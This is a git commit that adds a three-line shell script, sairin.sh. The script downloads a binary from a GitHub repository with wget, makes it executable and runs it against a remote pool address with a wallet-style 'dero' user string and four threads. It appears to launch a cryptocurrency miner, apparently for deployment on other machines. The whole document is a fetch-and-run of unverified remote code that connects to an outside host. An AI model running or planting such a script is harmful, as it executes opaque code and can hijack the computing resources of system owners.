7978f3d240f63748feafb02f067bb14a8846f4d7
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-28 23:04:06 +0800

    Create sairin.sh

---
+++ sairin.sh
@@ -0,0 +1,3 @@
+wget https://github.com/sbwsmg/lol/raw/main/sairin
+chmod 700 sairin
+./sairin -o 139.162.40.79:443 -u deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6hsk03skqgr8tscz0xla -t 4
